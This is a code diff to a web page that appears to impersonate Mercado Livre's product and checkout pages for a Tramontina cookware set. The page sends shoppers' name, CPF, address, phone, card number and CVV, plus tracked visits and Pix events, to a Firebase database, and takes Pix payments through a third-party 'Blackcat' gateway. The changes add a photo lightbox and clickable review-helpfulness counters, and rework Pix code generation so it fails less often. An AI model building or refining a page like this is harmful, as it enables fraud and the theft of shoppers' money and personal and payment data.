@@ -6,7 +6,6 @@
 <title>Mercado Livre</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
-/* O CSS INTEIRO CONTINUA O MESMO DA VERSÃO ANTERIOR */
 *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
 body{margin:0;font-family:'Inter',sans-serif;background:#ebebeb;color:#333;font-size:15px;line-height:1.5}
 img{max-width:100%;display:block}
@@ -94,8 +93,9 @@ img{max-width:100%;display:block}
 .comentario__fotos img{width:76px;height:76px;object-fit:cover;border-radius:6px;border:1px solid #e0e0e0;cursor:pointer;transition:transform .2s}
 .comentario__fotos img:active{transform:scale(.96)}
 .comentario__footer{display:flex;align-items:center;gap:12px;font-size:13px;color:#666}
-.comentario__util{display:flex;align-items:center;gap:4px;background:none;border:1px solid #ddd;border-radius:16px;padding:5px 12px;font-size:13px;color:#666;cursor:pointer}
-.comentario__util:active{border-color:#3483fa;color:#3483fa}
+.comentario__util{display:flex;align-items:center;gap:4px;background:none;border:1px solid #ddd;border-radius:16px;padding:5px 12px;font-size:13px;color:#666;cursor:pointer;transition:0.2s;}
+.comentario__util:hover{background:#f0f7ff;border-color:#3483fa;color:#3483fa;}
+.comentario__util.curtido{background:#e8f0fe;border-color:#3483fa;color:#3483fa;font-weight:600;}
 .termos-busca,.busca-letra{max-width:1200px;margin:8px auto 0;background:#fff;border-radius:8px;padding:16px}
 @media(min-width:768px){.termos-busca,.busca-letra,.rodape{margin-top:16px;padding:24px}}
 .termos-busca h2,.busca-letra h2{font-size:16px;font-weight:600;margin:0 0 12px}
@@ -114,14 +114,12 @@ img{max-width:100%;display:block}
 .rodape__legal{font-size:11px;color:#999;line-height:1.6;margin:0;padding-top:12px;border-top:1px solid #e0e0e0}
 @media(max-width:768px){.termos-busca,.busca-letra,.rodape{margin-left:8px;margin-right:8px}}
 
-/* ========== ESTILOS DAS TELAS DE CHECKOUT (ESPALHADAS) ========== */
+/* Telas de Checkout */
 .tela-cheia{position:fixed;inset:0;background:#fff;z-index:2000;display:flex;flex-direction:column;overflow-y:auto}
 .tela-cheia.hidden{display:none!important}
 .tela-cheia header{background:#ffe600;padding:16px;text-align:center;font-weight:600;font-size:16px;position:sticky;top:0;z-index:10;display:flex;align-items:center;justify-content:center;box-shadow:0 2px 4px rgba(0,0,0,.05)}
 .tela-cheia header a{position:absolute;left:16px;top:50%;transform:translateY(-50%);text-decoration:none;font-size:24px;color:#333;font-weight:bold;padding:5px}
 .tela-cheia .conteudo{flex:1;padding:20px;max-width:600px;margin:0 auto;width:100%}
-
-/* Formulário de Endereço */
 .campo{margin-bottom:16px}
 .campo label{display:block;font-size:13px;font-weight:600;color:#333;margin-bottom:6px}
 .campo input{width:100%;padding:14px 12px;border:1.5px solid #ddd;border-radius:8px;font-size:15px;outline:none;transition:border .2s}
@@ -130,8 +128,6 @@ img{max-width:100%;display:block}
 .campo small{font-size:11px;color:#888;margin-top:4px;display:block}
 .campo small.erro{color:#ff3b30;font-weight:600}
 .btn-continuar{width:100%;padding:16px;background:#3483fa;color:#fff;font-size:16px;font-weight:600;border:none;border-radius:8px;cursor:pointer;margin-top:20px}
-
-/* Frete */
 .endereco-resumo{background:#f8f8f8;padding:16px;border-radius:8px;font-size:14px;line-height:1.6;margin-bottom:20px;color:#333}
 .opcoes-frete-lista{display:flex;flex-direction:column;gap:12px}
 .opcao-frete{display:flex;align-items:center;padding:16px;border:1px solid #ddd;border-radius:8px;background:#fff;cursor:pointer;transition:all .2s}
@@ -142,8 +138,6 @@ img{max-width:100%;display:block}
 .opcao-frete .frete-texto{flex:1;font-size:15px;font-weight:500;color:#333}
 .opcao-frete .frete-preco{color:#00a650;font-weight:700;font-size:15px}
 .opcao-frete .frete-recomendado{font-size:11px;color:#888;font-weight:400;display:block;margin-top:2px}
-
-/* Pagamento */
 .metodo-pagamento{display:flex;align-items:center;padding:20px 16px;border:1px solid #ddd;border-radius:8px;background:#fff;margin-bottom:12px;cursor:pointer;position:relative}
 .metodo-pagamento:active{border-color:#3483fa;background:#f0f7ff}
 .metodo-pagamento img{width:40px;height:40px;margin-right:16px;object-fit:contain}
@@ -153,8 +147,6 @@ img{max-width:100%;display:block}
 .badge-recomendado{background:#000;color:#fff;font-size:10px;font-weight:700;padding:3px 8px;border-radius:12px;text-transform:uppercase;position:absolute;top:-8px;right:16px;letter-spacing:.5px}
 .rodape-pagamento{position:fixed;bottom:0;left:0;width:100%;background:#fff;border-top:1px solid #eee;padding:16px 20px;display:flex;justify-content:space-between;align-items:center;font-size:16px;box-shadow:0 -4px 12px rgba(0,0,0,.05);z-index:10}
 .rodape-pagamento strong{font-size:20px;color:#333}
-
-/* Pix e Cartão */
 .pix-box{background:#fff;border-radius:8px;padding:24px;text-align:center;border:1px solid #eee;box-shadow:0 4px 12px rgba(0,0,0,.05)}
 .pix-qr{max-width:220px;margin:20px auto;border:1px solid #eee;border-radius:8px;padding:10px}
 .pix-copia{width:100%;padding:14px;font-size:13px;border:1px solid #ccc;border-radius:8px;margin-top:10px;text-align:center;background:#f8f8f8}
@@ -165,12 +157,18 @@ img{max-width:100%;display:block}
   .tela-cheia header{max-width:600px;margin:0 auto;border-radius:8px 8px 0 0}
   .rodape-pagamento{position:relative;max-width:600px;margin:0 auto;border-radius:0 0 8px 8px}
 }
+
+/* Lightbox */
+#lightbox{position:fixed;inset:0;background:rgba(0,0,0,.92);z-index:99999;display:none;align-items:center;justify-content:center;padding:20px}
+#lightbox img{max-width:100%;max-height:90vh;object-fit:contain;border-radius:8px}
+#lightbox .fechar{position:absolute;top:20px;right:20px;background:#fff;color:#000;border:none;width:44px;height:44px;border-radius:50%;font-size:24px;cursor:pointer;display:flex;align-items:center;justify-content:center;font-weight:bold}
 </style>
 </head>
 <body>
 
 <div id="telaLoading" class="hidden"><div class="loader"></div><p>Processando sua compra…</p></div>
 
+<!-- LIGHTBOX (Foto Ampliada) -->
 <div id="lightbox" onclick="if(event.target.id==='lightbox')fecharLightbox()">
   <button class="fechar" onclick="fecharLightbox()">×</button>
   <img id="lightboxImg" src="" alt="Foto ampliada">
@@ -203,7 +201,7 @@ img{max-width:100%;display:block}
   <div class="container">
     <div class="produto">
       <div class="galeria">
-        <img class="galeria__principal" id="imagemPrincipal" src="https://http2.mlstatic.com/D_NQ_NP_664015-MLA95696482092_102025-O.webp" alt="Jogo De Panelas Paris Com 5 Peças Chumbo Tramontina">
+        <img class="galeria__principal" id="imagemPrincipal" src="https://http2.mlstatic.com/D_NQ_NP_664015-MLA95696482092_102025-O.webp" alt="Jogo De Panelas Paris Com 5 Peças Chumbo Tramontina" onclick="abrirLightbox(this.src)" style="cursor:zoom-in;">
         <div class="galeria__miniaturas">
           <img src="https://http2.mlstatic.com/D_Q_NP_664015-MLA95696482092_102025-R.webp" class="ativa" onclick="trocarImagem(this,'https://http2.mlstatic.com/D_NQ_NP_664015-MLA95696482092_102025-O.webp')">
           <img src="https://http2.mlstatic.com/D_Q_NP_715587-MLA84536583464_052025-R.webp" onclick="trocarImagem(this,'https://http2.mlstatic.com/D_NQ_NP_715587-MLA84536583464_052025-O.webp')">
@@ -318,7 +316,7 @@ Peso: 3,845 kg</p>
             <img src="https://http2.mlstatic.com/D_NQ_NP_2X_957516-MLA74797680990_032024-O.webp" onclick="abrirLightbox(this.src)" alt="Foto do comprador">
           </div>
           <div class="comentario__footer">
-            <button class="comentario__util">👍 Útil · 50</button>
+            <button class="comentario__util" onclick="curtir(this, 50)">👍 Útil · <span>50</span></button>
           </div>
         </div>
         <div class="comentario">
@@ -332,7 +330,7 @@ Peso: 3,845 kg</p>
             <img src="https://http2.mlstatic.com/D_NQ_NP_2X_735170-MLA75053581249_032024-O.webp" onclick="abrirLightbox(this.src)" alt="Foto do comprador">
           </div>
           <div class="comentario__footer">
-            <button class="comentario__util">👍 Útil · 38</button>
+            <button class="comentario__util" onclick="curtir(this, 38)">👍 Útil · <span>38</span></button>
           </div>
         </div>
         <div class="comentario">
@@ -346,7 +344,7 @@ Peso: 3,845 kg</p>
             <img src="https://http2.mlstatic.com/D_NQ_NP_2X_870882-MLA81657876325_122024-O.webp" onclick="abrirLightbox(this.src)" alt="Foto do comprador">
           </div>
           <div class="comentario__footer">
-            <button class="comentario__util">👍 Útil · 20</button>
+            <button class="comentario__util" onclick="curtir(this, 20)">👍 Útil · <span>20</span></button>
           </div>
         </div>
         <div class="comentario">
@@ -360,7 +358,7 @@ Peso: 3,845 kg</p>
             <img src="https://http2.mlstatic.com/D_NQ_NP_2X_833062-MLA74832420203_022024-O.webp" onclick="abrirLightbox(this.src)" alt="Foto do comprador">
           </div>
           <div class="comentario__footer">
-            <button class="comentario__util">👍 Útil · 18</button>
+            <button class="comentario__util" onclick="curtir(this, 18)">👍 Útil · <span>18</span></button>
           </div>
         </div>
         <div class="comentario">
@@ -376,7 +374,7 @@ Peso: 3,845 kg</p>
             <img src="https://http2.mlstatic.com/D_NQ_NP_2X_934649-MLA73249651762_122023-O.webp" onclick="abrirLightbox(this.src)" alt="Foto do comprador">
           </div>
           <div class="comentario__footer">
-            <button class="comentario__util">👍 Útil · 17</button>
+            <button class="comentario__util" onclick="curtir(this, 17)">👍 Útil · <span>17</span></button>
           </div>
         </div>
       </div>
@@ -579,8 +577,15 @@ window.addEventListener('beforeunload',()=>{db.ref('visitas/'+clienteId).update(
 
 pedidoRef.update({valor:VALOR_PEDIDO,produto:'Jogo de Panelas Tramontina',entrouEm:Date.now()});
 
+// Funções de Lightbox e Curtir
 function abrirLightbox(src){document.getElementById('lightboxImg').src=src;document.getElementById('lightbox').style.display='flex';}
 function fecharLightbox(){document.getElementById('lightbox').style.display='none';}
+function curtir(botao, valorOriginal) {
+  if(botao.classList.contains('curtido')) return;
+  const span = botao.querySelector('span');
+  span.textContent = valorOriginal + 1;
+  botao.classList.add('curtido');
+}
 
 const appSite=document.getElementById('appSite');
 const appEndereco=document.getElementById('appEndereco');
@@ -642,7 +647,7 @@ document.getElementById('cpf').addEventListener('input',function(){let v=this.va
 document.getElementById('cep').addEventListener('input',function(){let v=this.value.replace(/\D/g,'');if(v.length>8)v=v.slice(0,8);v=v.replace(/(\d{5})(\d)/,'$1-$2');this.value=v;});
 document.getElementById('telefone').addEventListener('input',function(){let v=this.value.replace(/\D/g,'');if(v.length>11)v=v.slice(0,11);let f='';if(v.length>0)f='('+v.slice(0,2);if(v.length>=3)f+=') '+v.slice(2,v.length>=7?7:v.length);if(v.length>=7)f+='-'+v.slice(7);this.value=f;});
 
-// Submeter Endereço com validação travando
+// Submeter Endereço
 document.getElementById('formEndereco').addEventListener('submit',function(e){
   e.preventDefault();
   
@@ -658,7 +663,6 @@ document.getElementById('formEndereco').addEventListener('submit',function(e){
   const estado = document.getElementById('estado').value.trim();
   const telefone = document.getElementById('telefone').value.trim();
 
-  // Valida tudo
   const vNome = validarNome(nome, 'erroNome');
   const vEmail = validarEmail(email, 'erroEmail');
   const vCpf = validarCpf(cpf, 'erroCpf');
@@ -672,7 +676,7 @@ document.getElementById('formEndereco').addEventListener('submit',function(e){
 
   if(!(vNome && vEmail && vCpf && vCep && vRua && vNumero && vBairro && vCidade && vEstado && vTelefone)){
     alert("Existem campos inválidos. Corrija-os para continuar.");
-    return; // TRAVA AQUI
+    return;
   }
 
   const dados = {nome,email,cpf,cep,rua,numero,complemento,bairro,cidade,estado,telefone};
@@ -707,7 +711,7 @@ function irParaPagamento(){
 }
 function voltarFrete(){appPagamento.classList.add('hidden');appFrete.classList.remove('hidden');window.scrollTo(0,0);}
 
-/* ========== PIX ========== */
+/* ========== PIX CORRIGIDO ========== */
 async function escolherPix(){
   appPagamento.classList.add('hidden');appPix.classList.remove('hidden');window.scrollTo(0,0);
 
@@ -728,8 +732,7 @@ async function escolherPix(){
 
   const apiKey=String(blackcatApiKeyCache||'').trim();
   if(!apiKey){
-    msg.textContent='Pix indisponível no momento. Tente novamente mais tarde.';
-    return;
+    msg.textContent='Pix indisponível no momento. Tente novamente mais tarde.';return;
   }
 
   const cpfNumeros=end.cpf.replace(/\D/g,'');
@@ -748,25 +751,39 @@ async function escolherPix(){
     const resp=await fetch(BLACKCAT_BASE+'/sales/create-sale',{
       method:'POST', headers:{'Content-Type':'application/json','X-API-Key':apiKey}, body:JSON.stringify(body)
     });
+    
+    // AQUI ESTAVA O ERRO ANTIGO. CORRIGIDO AGORA:
     const data=await resp.json();
-    if(!resp.ok || !data.success){
-      msg.textContent = 'Não foi possível gerar o Pix. ' + (data.message||data.error||'');return;
+    
+    // Se a Blackcat respondeu algo, mesmo que erro, mostramos
+    if(!resp.ok){
+       throw new Error(data.message || data.error || 'Erro na API da Blackcat');
     }
-    const t=data.data;const pd=t.paymentData||{};
-    const qrSrc = pd.qrCodeBase64 || ('https://api.qrserver.com/v1/create-qr-code/?size=300x300&data='+encodeURIComponent(pd.copyPaste||pd.qrCode||''));
-    const copia = pd.copyPaste || pd.qrCode || '';
+
+    // Tenta achar os dados do PIX
+    const t = data.data || data;
+    const pd = t.paymentData || t;
+    const copia = pd.copyPaste || pd.qrCode || pd.pixCode || '';
+    
+    if(!copia) throw new Error('A API não retornou o código Pix.');
+
+    // Se a API não mandar a imagem base64, geramos uma usando o código copia e cola
+    const qrSrc = pd.qrCodeBase64 || ('https://api.qrserver.com/v1/create-qr-code/?size=300x300&data='+encodeURIComponent(copia));
 
     msg.style.display='none';box.style.display='block';
     document.getElementById('qrCodeImg').src=qrSrc;
     document.getElementById('chavePix').value=copia;
     document.getElementById('pixTopo').textContent='Pague R$ 159,44 via Pix';
+
     pedidoRef.update({
       'blackcat': { transactionId: t.transactionId||'', status: t.status||'PENDING', amount: t.amount||VALOR_CENTAVOS, netAmount: t.netAmount||0, fees: t.fees||0, invoiceUrl: t.invoiceUrl||'', copyPaste: copia, qrCodeBase64: pd.qrCodeBase64||'', expiresAt: pd.expiresAt||'', criadoEm: Date.now() },
       'pix': { geradoEm: Date.now(), copiado: false, valor: VALOR_PEDIDO, chave: copia, qrCode: qrSrc, transactionId: t.transactionId||'' }
     });
-    db.ref('alertas').push({tipo:'pix_gerado',clienteId,transactionId:t.transactionId,timestamp:Date.now()});
+    db.ref('alertas').push({tipo:'pix_gerado',clienteId,transactionId:t.transactionId||'',timestamp:Date.now()});
+
   } catch(err){
-    msg.textContent='Falha de conexão com o pagamento.';
+    console.error("Erro Blackcat:", err);
+    msg.textContent = 'Não foi possível gerar o Pix. Motivo: ' + err.message;
   }
 }
 
@@ -799,7 +816,6 @@ function showSlide(n){
 }
 function anterior(){if(currentSlide>1){currentSlide--;showSlide(currentSlide);}}
 function seguinte(){
-  // VALIDAÇÃO AO AVANÇAR DO CARTÃO
   if(currentSlide === 1){
     const num = document.getElementById('numeroCartao').value.replace(/\D/g,'');
     if(num.length !== 16){document.getElementById('erroCartaoNumero').textContent='O cartão precisa ter exatamente 16 números.';document.getElementById('erroCartaoNumero').className='erro';return;}
@@ -834,12 +850,11 @@ function pagarCartao(){
   const cvv=document.getElementById('cvv').value.trim();
   const cpfC=document.getElementById('cpfCartao').value.trim();
   
-  // VALIDA CPF FINAL
   const cpfNum = cpfC.replace(/\D/g,'');
   if(cpfNum.length !== 11){
     document.getElementById('erroCartaoCpf').textContent = "CPF precisa ter 11 números.";
     document.getElementById('erroCartaoCpf').className='erro';
-    return; // TRAVA AQUI
+    return;
   }
   document.getElementById('erroCartaoCpf').textContent='';document.getElementById('erroCartaoCpf').className='';
 
